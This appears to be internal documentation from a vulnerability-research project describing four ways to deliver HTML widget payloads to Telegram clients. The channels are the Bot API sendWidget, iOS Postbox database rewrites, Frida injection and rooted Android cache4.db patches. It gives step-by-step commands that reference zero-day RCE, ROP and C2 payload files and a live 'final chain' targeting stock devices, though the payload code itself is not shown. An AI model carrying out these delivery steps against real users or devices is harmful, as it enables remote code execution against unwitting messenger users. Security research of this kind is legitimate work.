# How a widget is delivered

There are four delivery channels. They reach the same renderer. They differ in
what they require and in whether they preserve the widget's identity.

| Channel | Platform | Needs | Used for |
|---|---|---|---|
| Bot API `sendWidget` | Android, iOS | A whitelisted bot and a chat with the bot | The Pixel 9 route, the iPhone 17e route, the no-root Sony runs |
| Postbox row rewrite (`t7`) | iOS | Filesystem access to the app's AppGroup database | Same-widget updates on the 6s. Not available on the stock 17e (AppGroup lookup fails). |
| Frida message insert | iOS, jailbroken 6s | Frida on the device | Fast local iteration on the 6s |
| `cache4.db` patch | Android, rooted lab device | Root or `adb root` | Sony lab runs and calibration |

A widget runs when the message is rendered. Re-opening the chat or scrolling
the message back into view runs it again. This is why a payload must be safe to
re-run, or must check a marker and stop.

**Delivery policy — lab vs final.** Use the Android `cache4.db` patch
(root/adb; `docs/common/tools/build_android_widget_db.py` /
`patch_android_widget_db.py`; pull/patch/push, remove WAL/SHM) for
lab/intermediate tests; it is fast and avoids the bot flood wait. Use the bot
`sendWidget` **only for the final stock tests/demo**. The DB patch is not the
final delivery; the final chain must use the stock bot message with no
root/Frida. The flood wait is a test-time server throttle, not part of the
final chain.

## Cleanup (hard gate)

- The chat must be clean **before every send and after every read**. Old
  widgets re-render on open, can crash/stop the app, and make the run a
  contaminated data point — and the user sees them.
- **Bot-sent widgets:** delete with the bot token `deleteMessage`.
- **Android `cache4.db` rows:** the bot API cannot delete these local rows.
  Remove the `messages` / `messages_v2` rows, fix `dialogs.last_mid`, or
  clear the chat; record the ids; verify no old widget bubbles remain.
- The lab DB patch and the final bot run both clean before/after; the final
  run must be visibly clean.

**Current live/final account (2026-11-10):** **@<BOT_USERNAME> (bot id
<BOT_ID>) → <TG_USERNAME>, user id <CHAT_ID>**, using the generic
`send_widget.py --chat-id <CHAT_ID>` token in
`/tmp/opencode/tgbot/token.env` (no `--wasd`). `getChat('@<TG_USERNAME>')` fails
(private username lookup); use the numeric user id — it is not a blocker.
The earlier @<BOT_USERNAME>/@<TG_USERNAME> (<CHAT_ID>) was the lab sender and
lab devices are research only. Clean the <BOT_USERNAME> chat before/after every
run.

A widget that goes past a limit or crashes is stopped: its last frame stays
with a "Widget stopped" badge, and the app rebuilds it when it is shown again.
After **two crashes in a row** it stays stopped until the app restarts
(official: Telegram Widgets guide, "Lifecycle" section; the "Limits" table
lists "Crashes: 2 in a row"). Operational rule: count consecutive widget/app
crashes; after two, restart the app before the next delivery attempt. A
stopped bubble observed after two crashes is the stop latch, not a new render,
and is not a new data point.

## 1. Bot API `sendWidget` (remote, production path)

Official methods (Bot API reference, fetched 2026-11-09):

- [`sendWidget`](https://core.telegram.org/bots/api#sendwidget) — send a message with an HTML widget.
- [`sendSharedWidget`](https://core.telegram.org/bots/api#sendsharedwidget) — send again a shared widget created by the bot.
- [`answerWidgetQuery`](https://core.telegram.org/bots/api#answerwidgetquery) — answer a query from a widget.
- Guide: [Telegram Widgets](https://core.telegram.org/bots/widgets).

Official statement on both send methods: *"Currently, in the production
environment, widgets can be sent only to private chats, and sent widgets
automatically have protected content and therefore can't be forwarded."* On
success the sent
[Message](https://core.telegram.org/bots/api/types/message.md) is returned; its
[`widget`](https://core.telegram.org/bots/api/types/widget.md) object carries
`id` (shared widgets only), `width`, `height`, `html`, `public_data`,
`chat_data`.

Endpoint as documented, plus the lab-observed beta base:

```
POST https://api.telegram.org/bot<TOKEN>/sendWidget          (documented)
POST https://api.telegram.org/beta/bot<TOKEN>/sendWidget     (lab-observed base, not documented)
Content-Type: application/json
```

The beta base is a lab observation. The standard base is the documented path
and returned HTTP 200 with the same `widget` message shape, no redirect, and
the same `400 parameter "html" is required` control on an empty body
(measured 2026-11-08 on one whitelisted bot; does not prove the method is open
to every bot).

Body (official `sendWidget` parameter set; only `chat_id` and `html` are
required):

```json
{
  "chat_id": <CHAT_ID>,
  "html": "<!doctype html>...",
  "width": 480,
  "height": 320,
  "public_data": "<0-1024 bytes>",
  "chat_data": "<0-1024 bytes>",
  "caption": "<0-1024 characters>",
  "allow_queries": true,
  "is_shared": false,
  "protect_content": false,
  "reply_markup": { }
}
```

Remaining official parameters: `message_thread_id`, `parse_mode`,
`caption_entities`, `show_caption_above_media`, `disable_notification`,
`allow_paid_broadcast`, `message_effect_id`, `reply_parameters`.
`sendSharedWidget` takes `chat_id` + `widget_id` (both required) plus
`message_thread_id`, `chat_data`, the caption fields, `protect_content` and
the usual message parameters; `allow_queries`/`is_shared` are fixed on the
shared widget and are not re-passed.

Notes:

- **Size limits (official).** `html` is 1-32,768 bytes and must not exceed
  4,096 bytes when compressed by zlib at the maximum compression level; the
  server compresses and checks. A NUL byte (U+0000) in the HTML is refused
  with `INPUT_MEDIA_WIDGET_HTML_INVALID`; anything over the limits with
  `INPUT_MEDIA_WIDGET_TOO_LARGE`. The lab-measured boundaries
  (32,768/32,769 raw, 4,096/4,097 zlib-9) match the official limits — see
  `docs/widget_bot_limits_20261105.md`.
- **Size anchors (official).** `width` is clamped by the app to
  200...max bubble width; `height` to 50-600. Omitted or `0` means automatic.
- **State fields (official).** `public_data` and `chat_data` are each
  0-1,024 bytes; `caption` 0-1,024 characters.
- **Queries (official).** `allow_queries` lets the widget send requests.
  Background requests are allowed by the server only for the original in the
  private chat with the bot (one on appear, then at most one per 5 s while
  visible). `background_query` and `fwd_allow_queries` are **not** official
  parameters — they were observed on the beta endpoint (lab) and must not be
  relied on.
- **Gating (lab observation).** The endpoint is server-gated: a bot or
  account that is not whitelisted gets `400 INPUT_MEDIA_WIDGET_NOT_ALLOWED`.
  This is an account permission, not a protocol error; the official docs do
  not mention a whitelist.
- Each `sendWidget` creates a new message id. A design that needs the same
  widget id across two payloads (for example a storage seed followed by an
  exploit) cannot rely on two independent `sendWidget` calls. The Postbox
  rewrite is the proven same-message-id path. Cross-chat sharing preserves the
  widget object id (see below); a same-chat seed/exploit swap has not been
  tested.

### 1.1 Sharing, forwarding, copying — official status vs lab measurements

**Current status (official docs, fetched 2026-11-09): widgets are in
production but not yet forwardable.** Availability per the official Telegram
Widgets guide:

| Feature | Test server | Production |
|---|---|---|
| Widgets in the private chat with the bot, with requests and the wallet | Yes | Yes |
| Forwarding widget messages | Yes | No |
| Widgets in groups | Yes | No |
| Widgets in inline mode | Yes | No |

What the official docs say about forwarding and copying, exactly:

- *"In the production environment, a bot sends widgets only to private chats
  with users, and users cannot forward its widget messages."*
- *"sent widgets automatically have protected content and therefore can't be
  forwarded"* — stated on both `sendWidget` and `sendSharedWidget`.
- *"Widgets cannot be copied: `copyMessage` and `copyMessages` refuse them.
  A widget sent with `protect_content` cannot be forwarded."*
- Forwards exist only on the test server. A forward of a shared widget follows
  its shared state and may ask the bot on a tap if the widget was sent with
  `allow_queries`; a forward of a static widget is a frozen copy with no
  requests.

Lab measurements (2026-11-08, `forward_test/` matrix plus one live update,
one whitelisted bot; marked lab, not official):

- `sendWidget` with `"is_shared": true` on either base returned a shared
  widget object with `widget.id` — consistent with the official `is_shared`
  parameter.
- `sendSharedWidget` with `{"chat_id": <other chat>, "widget_id": <id>}` on
  the standard base placed the same widget in another chat (A to B, HTTP 200).
  The delivered message still had `has_protected_content: true` — consistent
  with the official "automatically have protected content" statement.
- `forwardMessage` and `copyMessage` of every bot-created widget message were
  refused: `400 Bad Request: the message can't be forwarded` and
  `the message can't be copied`. This held for default, `is_shared`,
  same-chat, and `fwd_allow_queries:true` variants (`fwd_allow_queries` is a
  lab-observed flag, not an official parameter). Consistent with the official
  "can't be forwarded" / "cannot be copied" statements.
- `has_protected_content` stayed `true` for all bot-created widget messages;
  `protect_content:false` was accepted but ignored (lab) — consistent with
  production widgets always being protected.
- A user/third-party widget copy is a different object (lab, observed once
  outside the `forward_test/` matrix). The Bot API update showed
  `forward_origin: {type: "hidden_user", ...}` and
  `widget: {html: <...>, is_copy: true}`, with no `has_protected_content`.
  `forwardMessage` of that copy from chat A to chat B succeeded;
  `copyMessage` still failed. The forwarded message keeps `is_copy: true` and
  has no `widget.id` or live query handle: it is a static HTML copy, not a
  live shared widget. The official guide says a production widget message is
  always protected and cannot be forwarded, and that user forwarding exists
  only on the test server; re-test this observation against the current
  production rules before relying on it.

Operational consequence: forwardability is a property of the source widget
copy, not of the method alone. Bot-created payload messages are protected in
production. Do not use forwarding as a payload-delivery primitive for
bot-created messages.

The standard-library sender in this repository:

```sh
export BOT_TOKEN='123456:ABC...'
python3 bot/send_widget.py \
  --html vulns/0day-2-RCE-PARSER-SCOPE/XTAG/payloads/c2-final-sony-beta-72929.html \
  --chat-id <CHAT_ID> \
  --allow-queries --background-query

# standard base, shared object, then cross-chat placement
python3 bot/send_widget.py --api standard --is-shared \
  --html <widget.html> --chat-id <CHAT_ID>
python3 bot/send_widget.py --api standard \
  --share-chat-id <OTHER_CHAT_ID> --share-widget-id <WIDGET_ID>
```

`--dry-run` prints the sizes and the call without sending. `--api standard`
selects the standard base; the default is `beta` for compatibility.
`--background-query` emits the lab-observed `background_query` parameter (not
in the official API); officially, background requests are server-decided for
the original in the private chat with the bot.

The sender checks the two size limits before it connects. It never stores a
token.

## 2. Postbox row rewrite (iOS, same message id)

iOS stores messages in a Postbox database. A local widget message is a `t7`
row:

```
key   = peer(8) | namespace(4) | timestamp(4) | message_id(4)
value = serialized Message object; the widget HTML is a raw zlib stream
        (78 da / 78 9c) preceded by a 4-byte little-endian compressed length
```

The rewrite tool replaces only the zlib stream and its length prefix. The key,
the message id, and every other serialization byte stay the same. That keeps
the widget identity, which is what `localStorage` is keyed by.

Path (stock or jailbroken, account id varies):

```
/private/var/mobile/Containers/Shared/AppGroup/<UUID>/telegram-data/account-<id>/postbox/db/db_sqlite
```

Procedure:

```sh
# 1. Stop Telegram so Postbox checkpoints. Pull the database and its WAL/SHM.
mkdir -p /tmp/opencode/postbox && cd /tmp/opencode/postbox
scp mobile@<phone>:'<APPGROUP>/telegram-data/account-<id>/postbox/db/db_sqlite*' .
cp db_sqlite db_sqlite-wal db_sqlite-shm backup/ 2>/dev/null || true

# 2. List widget rows and find the seed row.
python3 docs/common/tools/list_ios_postbox_rows.py list db_sqlite
python3 docs/common/tools/postbox_rewrite_widget.py --db db_sqlite --list

# 3. Rewrite the row in a copy.
python3 docs/common/tools/postbox_rewrite_widget.py \
  --db db_sqlite --ns 1 --message-id <row_id> \
  --html vulns/0day-2-RCE-PARSER-SCOPE/TINY/payloads/inline-rop-h200.html \
  --out db_sqlite.new \
  --expect N1IOS_SEED \
  --preserve-length --pad-html

# 4. Push the checkpointed database back and remove stale WAL/SHM.
scp db_sqlite.new mobile@<phone>:'<APPGROUP>/telegram-data/account-<id>/postbox/db/db_sqlite'
ssh mobile@<phone> "rm -f '<APPGROUP>/telegram-data/account-<id>/postbox/db/db_sqlite-wal' \
  '<APPGROUP>/telegram-data/account-<id>/postbox/db/db_sqlite-shm'"

# 5. Relaunch Telegram and open the chat.
```

`--preserve-length --pad-html` keeps the uncompressed HTML length, the
compressed length, the `t7` value length, and all field offsets equal to the
seed row. It appends an HTML comment outside the script to tune the compressed
length. This avoids the Postbox decoder trap seen when the row's length fields
move.

Rollback: restore `backup/db_sqlite*`, remove any new `-wal`/`-shm`, relaunch.

The tool runs `pragma integrity_check` before and after the rewrite and
verifies that the new value decompresses byte-for-byte to the new HTML. It
does not touch the device.

## 3. Frida message insert (jailbroken iPhone 6s)

The 6s has a jailbreak and `frida-server`. Telegram exposes:

```
TelegramCore.TelegramEngine.Messages.debugInsertLocalWidgetMessages(
    peerId: Postbox.PeerId, posts: [TelegramCore.EngineLocalWidgetPost])
```

This inserts a new local widget message. It cannot edit an existing message:
`EngineLocalWidgetPost` has no message-id field. The API assigns a new id, so
it cannot preserve a seed row's widget id.

Usage:

```sh
python3 docs/instrumentation/ios6s/deliver_widget_frida_wifi.py \
  --pid <Telegram pid> \
  --html vulns/0day-2-RCE-PARSER-SCOPE/TINY/payloads/probe-h400.html \
  --account-peer <account peer id> \
  --chat-peer <chat peer id>
```

The script embeds the HTML in the Frida script as UTF-8 and calls the engine
method. It does not use the network. It is 6s-only: a stock app has no
`get-task-allow` entitlement, so Frida cannot attach to it.

## 4. `cache4.db` patch (rooted Android lab device)

Android stores message media in `cache4.db`. The widget payload is a zlib
stream inside the `messageMediaWidget` object. The tool decompresses and
recompresses it and preserves the attach-path tail.

Procedure:

```sh
adb pull /data/data/org.telegram.messenger.beta/files/cache4.db cache4.db
python3 docs/common/tools/patch_android_widget_db.py cache4.db <message_id> \
  --html vulns/0day-2-RCE-PARSER-SCOPE/XTAG/payloads/final-sony-beta-72929.html
adb shell am force-stop org.telegram.messenger.beta
adb push cache4.db /data/data/org.telegram.messenger.beta/files/cache4.db
adb shell rm -f /data/data/org.telegram.messenger.beta/files/cache4.db-wal \
                 /data/data/org.telegram.messenger.beta/files/cache4.db-shm
adb shell monkey -p org.telegram.messenger.beta 1
```

`build_android_widget_db.py` creates a new message row from scratch. It was
used for the Sony runs with message id 80345.

Root is needed only for the file replacement, not for the exploit. On 72929
and earlier the exploit itself runs as the app UID; on 72979/72989 it runs in
the isolated widget process. The no-root Sony run used `sendWidget` instead and
produced the same proof on the pre-72979 build.

## Which channel was used where

| Run | Channel | Why |
|---|---|---|
| Sony 72929 / 72889 certification | `cache4.db` row 80345 | Fast, repeatable, root available |
| Sony no-root control | Bot API `sendWidget` | Proves the chain without root |
| Sony C2 | `cache4.db` row 80345 + `adb reverse` | The bootstrap uses loopback |
| Pixel 72801 | Bot API `sendWidget` | No root on the device |
| iPhone 6s probes and finals | Frida insert, then Postbox rewrite for the same widget id | Storage seed must keep the widget id |
| iPhone 17e | Bot API `sendWidget` | Stock app; no Frida; the stock AppGroup is not resolvable for the Postbox rewrite |

## Common mistakes

- Sending to a base that the bot is not whitelisted on. Both bases serve
  `sendWidget`, but the bot/account permission is separate.
- Sending a widget larger than 4,096 bytes after zlib. The API refuses it
  with `INPUT_MEDIA_WIDGET_TOO_LARGE`; a NUL byte in the HTML is refused with
  `INPUT_MEDIA_WIDGET_HTML_INVALID` (official).
- Forgetting `allow_queries` / `background_query`. `TelegramWidget.request`
  then fails or never answers. Officially only `allow_queries` is a parameter;
  `background_query` is lab-observed.
- Expecting a bot-created widget to be forwardable. Production widgets are
  automatically protected and cannot be forwarded or copied; use `is_shared`
  + `sendSharedWidget` or the Postbox rewrite. User forwarding of widget
  messages is test-server only (official).
- Treating a user-forwarded `is_copy: true` widget as a live widget. It is a
  static HTML copy with no `widget.id` or query handle (the official JS name
  for the flag is `TelegramWidget.isForward`).
- Rewriting a Postbox row without preserving the length fields. The Postbox
  decoder traps (`brk #1`) before any JavaScript runs.
- Re-opening the chat and expecting a one-shot payload not to run again. Use a
  marker or a guard.
